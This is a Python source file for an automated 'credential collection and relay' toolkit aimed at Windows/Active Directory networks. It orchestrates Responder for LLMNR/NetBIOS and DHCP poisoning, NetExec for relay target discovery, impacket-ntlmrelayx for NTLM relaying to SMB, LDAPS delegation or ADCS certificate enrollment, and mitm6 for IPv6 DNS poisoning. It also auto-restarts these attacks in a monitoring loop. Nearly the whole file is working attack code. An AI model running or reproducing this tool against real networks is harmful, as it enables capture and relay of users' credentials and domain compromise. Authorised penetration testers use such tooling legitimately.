#!/usr/bin/env python3

import os
import sys
import time
import json
import shutil
import logging
import argparse
import netifaces
from datetime import datetime
from pathlib import Path
from threading import Thread, Event
from termcolor import colored
from subprocess import Popen, PIPE
import signal

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AuditTrail:
    def __init__(self, output_dir):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.audit_file = self.output_dir / 'audit.json'
        self.events = []
        self.start_time = datetime.now()
        
        # Create initial audit entry
        self.add_event('audit_start', {
            'timestamp': self.start_time.isoformat(),
            'output_dir': str(output_dir)
        })
    
    def add_event(self, event_type, details):
        event = {
            'timestamp': datetime.now().isoformat(),
            'type': event_type,
            'details': details
        }
        self.events.append(event)
        self.save()
    
    def save(self):
        try:
            # Ensure directory exists
            self.audit_file.parent.mkdir(parents=True, exist_ok=True)
            
            audit_data = {
                'start_time': self.start_time.isoformat(),
                'end_time': datetime.now().isoformat(),
                'events': self.events
            }
            
            # Write with error handling
            try:
                with self.audit_file.open('w') as f:
                    json.dump(audit_data, f, indent=2)
            except Exception as e:
                logger.error(f"Failed to write audit file: {e}")
                
        except Exception as e:
            logger.error(f"Error saving audit trail: {e}")

class CredentialToolkit:
    def __init__(self, args):
        self.args = args
        self.iface = args.interface or self.get_default_interface()
        self.local_ip = self.get_local_ip(self.iface)
        self.processes = []
        self.stop_event = Event()
        
        # Setup output directory with timestamp
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        self.output_dir = Path('output') / timestamp
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Initialize audit trail
        self.audit = AuditTrail(self.output_dir)
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def signal_handler(self, signum, frame):
        self.print_info("\nReceived signal to stop. Cleaning up...")
        self.stop_event.set()
        self.cleanup()
        sys.exit(0)

    def get_default_interface(self):
        try:
            return netifaces.gateways()['default'][netifaces.AF_INET][1]
        except Exception as e:
            logger.error(f"Error getting default interface: {e}")
            return "eth0"  # Fallback

    def get_local_ip(self, iface):
        try:
            return netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
        except Exception as e:
            logger.error(f"Error getting local IP: {e}")
            return "127.0.0.1"  # Fallback

    def setup_directory_structure(self):
        """Create all necessary directories"""
        try:
            dirs = ['hashes', 'relay', 'adcs', 'logs', 'web']
            for d in dirs:
                (self.output_dir / d).mkdir(parents=True, exist_ok=True)
            
            # Create Responder logs symlink with proper error handling
            responder_logs = Path('/usr/share/responder/logs')
            responder_link = self.output_dir / 'responder'
            
            if responder_logs.exists() and not responder_link.exists():
                try:
                    os.symlink(responder_logs, responder_link)
                except Exception as e:
                    logger.error(f"Failed to create Responder logs symlink: {e}")
            
            return True
        except Exception as e:
            self.print_bad(f"Error setting up directory structure: {e}")
            return False

    def run_command(self, cmd, timeout=None):
        """Execute command with improved error handling and timeout"""
        try:
            logger.info(f"Running command: {cmd}")
            
            process = Popen(
                cmd.split(),
                stdout=PIPE,
                stderr=PIPE,
                universal_newlines=True,
                bufsize=1
            )
            
            self.processes.append(process)
            
            def monitor_output():
                try:
                    while process.poll() is None and not self.stop_event.is_set():
                        output = process.stdout.readline()
                        if output:
                            logger.info(output.strip())
                except Exception as e:
                    logger.error(f"Error monitoring process output: {e}")
            
            # Start output monitoring in background
            Thread(target=monitor_output, daemon=True).start()
            
            if timeout:
                def kill_on_timeout():
                    time.sleep(timeout)
                    if process.poll() is None:
                        process.terminate()
                
                Thread(target=kill_on_timeout, daemon=True).start()
            
            return process
            
        except Exception as e:
            self.print_bad(f"Error running command '{cmd}': {e}")
            return None

    def find_relay_targets(self):
        """Find potential relay targets with retry mechanism"""
        try:
            self.print_info("Finding relay targets...")
            cmd = f"nxc smb {self.args.target_range} --gen-relay-list targets.txt"
            
            process = self.run_command(cmd)
            if not process:
                return False
                
            # Wait for completion with timeout
            try:
                process.wait(timeout=30)
            except Exception as e:
                logger.error(f"Timeout waiting for target discovery: {e}")
                process.terminate()
                return False
            
            targets_file = Path('targets.txt')
            if targets_file.exists():
                # Copy to output directory
                shutil.copy(targets_file, self.output_dir / 'relay' / 'targets.txt')
                return True
                
            return False
            
        except Exception as e:
            self.print_bad(f"Error in find_relay_targets: {e}")
            return False

    def start_responder(self):
        """Start Responder with proper configuration"""
        try:
            cmd_parts = [
                'responder',
                '-I', self.iface,
                '-wv'  # Always enable verbose output
            ]
            
            if self.args.analyze:
                cmd_parts.append('-A')
            if self.args.challenge:
                cmd_parts.extend(['--lm', '--disable-ess'])
            if self.args.dhcp:
                cmd_parts.append('-d')
            
            cmd = ' '.join(cmd_parts)
            process = self.run_command(cmd)
            
            if process:
                # Give Responder time to initialize
                time.sleep(3)
                if process.poll() is None:
                    self.print_good("Responder started successfully")
                    return process
            
            self.print_bad("Failed to start Responder")
            return None
            
        except Exception as e:
            self.print_bad(f"Error starting Responder: {e}")
            return None

    def start_ntlmrelay(self):
        """Start NTLM relay with appropriate configuration"""
        if not self.args.relay:
            return None
            
        try:
            cmd_parts = [
                'impacket-ntlmrelayx',
                '-tf', 'targets.txt',
                '-smb2support',
                '-l', str(self.output_dir / 'relay'),
                '-of', str(self.output_dir / 'relay' / 'ntlmrelay.log')
            ]
            
            if self.args.socks:
                cmd_parts.append('-socks')
            
            if self.args.relay_type:
                if self.args.relay_type == 'ldaps':
                    cmd_parts.extend(['-t', f'ldaps://{self.args.dc_ip}', '--delegate-access'])
                elif self.args.relay_type == 'smb':
                    cmd_parts.extend(['--no-http-server', '--no-smb-server'])
                elif self.args.relay_type == 'adcs':
                    cmd_parts.extend(['-t', f'http://{self.args.dc_ip}/certsrv/certfnsh.asp'])
            
            cmd = ' '.join(cmd_parts)
            process = self.run_command(cmd)
            
            if process:
                # Give relay time to initialize
                time.sleep(3)
                if process.poll() is None:
                    self.print_good("NTLM relay started successfully")
                    return process
            
            self.print_bad("Failed to start NTLM relay")
            return None
            
        except Exception as e:
            self.print_bad(f"Error starting NTLM relay: {e}")
            return None

    def start_mitm6(self):
        """Start mitm6 for IPv6 attacks"""
        if not self.args.ipv6 or not self.args.domain:
            return None
            
        try:
            cmd = f'mitm6 -d {self.args.domain} -i {self.iface}'
            process = self.run_command(cmd)
            
            if process:
                # Give mitm6 time to initialize
                time.sleep(3)
                if process.poll() is None:
                    self.print_good("mitm6 started successfully")
                    return process
            
            self.print_bad("Failed to start mitm6")
            return None
            
        except Exception as e:
            self.print_bad(f"Error starting mitm6: {e}")
            return None

    def auto_attack(self):
        """Run automated attack sequence with proper timing"""
        try:
            self.print_info("Starting automated attack sequence...")
            
            # Setup directory structure
            if not self.setup_directory_structure():
                return
            
            # Phase 1: Initial Recon
            self.print_info("Phase 1: Reconnaissance")
            targets_found = self.find_relay_targets()
            
            if targets_found:
                self.print_good("Found potential relay targets")
            else:
                self.print_info("No relay targets found - continuing with hash capture only")
            
            # Phase 2: Start Core Services
            self.print_info("Phase 2: Starting Core Services")
            
            # Start Responder first
            responder_proc = self.start_responder()
            if not responder_proc:
                return
            
            # Give Responder time to initialize fully
            time.sleep(5)
            
            # Start NTLM relay if targets were found
            if targets_found:
                relay_proc = self.start_ntlmrelay()
                if relay_proc:
                    self.print_good("NTLM relay started successfully")
                    time.sleep(3)
            
            # Start mitm6 if requested
            if self.args.ipv6 and self.args.domain:
                mitm6_proc = self.start_mitm6()
                if mitm6_proc:
                    self.print_good("mitm6 started successfully")
                    time.sleep(3)
            
            self.print_info("\nAttack infrastructure deployed and running")
            self.print_info("Active attack channels:")
            self.print_info("- NetBIOS/LLMNR Poisoning")
            if targets_found:
                self.print_info("- SMB Relay with SOCKS")
            if self.args.ipv6:
                self.print_info("- IPv6 DNS Poisoning")
            
            # Main monitoring loop
            try:
                while not self.stop_event.is_set():
                    # Check if processes are still running
                    if responder_proc and responder_proc.poll() is not None:
                        self.print_bad("Responder process died - restarting...")
                        responder_proc = self.start_responder()
                    
                    if targets_found and relay_proc and relay_proc.poll() is not None:
                        self.print_bad("NTLM relay process died - restarting...")
                        relay_proc = self.start_ntlmrelay()
                    
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                self.print_info("\nReceived keyboard interrupt - stopping...")
                
        except Exception as e:
            self.print_bad(f"Error in auto_attack: {e}")
            logger.exception("Exception in auto_attack")
            
        finally:
            self.cleanup()

    def cleanup(self):
        """Clean up processes and resources"""
        self.print_info("Cleaning up...")
        
        for process in self.processes:
            try:
                if process.poll() is None:
                    process.terminate()
                    try:
                        process.wait(timeout=5)
                    except:
                        process.kill()
            except Exception as e:
                logger.error(f"Error cleaning up process: {e}")
        
        # Final audit save
        try:
            self.audit.add_event('cleanup_completed', {
                'timestamp': datetime.now().isoformat()
            })
        except Exception as e:
            logger.error(f"Error in final audit save: {e}")

    def print_bad(self, msg): print(colored('[-] ', 'red') + msg)
    def print_info(self, msg): print(colored('[*] ', 'blue') + msg)
    def print_good(self, msg): print(colored('[+] ', 'green') + msg)

def parse_args():
    parser = argparse.ArgumentParser(description="Credential Collection and Relay Toolkit")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("-p", "--port", type=int, default=8080, help="HTTP server port (default: 8080)")
    
    # Attack targets
    parser.add_argument("-dc", "--dc-ip", help="Domain controller IP")
    parser.add_argument("-d", "--domain", help="Domain name for IPv6/WPAD attacks")
    parser.add_argument("-tr", "--target-range", default="192.168.1.0/24", help="Target range for relay discovery")
    
    # Collection options
    parser.add_argument("-a", "--analyze", action="store_true", help="Run in analyze mode")
    parser.add_argument("-c", "--challenge", help="Custom NTLM challenge for downgrade attacks")
    parser.add_argument("--dhcp", action="store_true", help="Enable DHCP poisoning")
    
    # Relay options
    parser.add_argument("-r", "--relay", action="store_true", help="Enable NTLM relay")
    parser.add_argument("-rt", "--relay-type", choices=['smb', 'ldaps', 'adcs'], help="Relay protocol type")
    parser.add_argument("-s", "--socks", action="store_true", help="Enable SOCKS proxy")
    
    # Attack modes
    parser.add_argument("--auto", action="store_true", help="Enable automated attack sequence")
    parser.add_argument("--ipv6", action="store_true", help="Enable IPv6 attacks")
    
    return parser

def check_dependencies():
    """Check if required tools are installed"""
    required_tools = {
        'nxc': 'NetExec (pipx install git+https://github.com/Pennyw0rth/NetExec.git)',
        'impacket-ntlmrelayx': 'Impacket (pipx install git+https://github.com/fortra/impacket.git)',
        'responder': 'Responder (pipx install git+https://github.com/lgandx/Responder.git)',
        'mitm6': 'mitm6 (pipx install mitm6)'
    }
    
    missing_tools = []
    for tool, install_info in required_tools.items():
        if not shutil.which(tool):
            missing_tools.append(f"{tool} - {install_info}")
    
    if missing_tools:
        print(colored("\nMissing required tools:", 'red'))
        for tool in missing_tools:
            print(colored(f"[-] {tool}", 'red'))
        print("\nPlease install missing tools before continuing.")
        sys.exit(1)

def main():
    if os.geteuid() != 0:
        print(colored('[-] ', 'red') + 'Script must run as root')
        sys.exit(1)
        
    check_dependencies()
    
    parser = parse_args()
    args = parser.parse_args()
    
    # Create and start toolkit
    toolkit = CredentialToolkit(args)
    
    if args.auto:
        toolkit.auto_attack()
    else:
        parser.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored('\n[*] ', 'blue') + 'Interrupted by user')
        sys.exit(0)
    except Exception as e:
        print(colored('[-] ', 'red') + f'Unhandled error: {str(e)}')
        logging.exception("Unhandled exception in main")
        sys.exit(1)
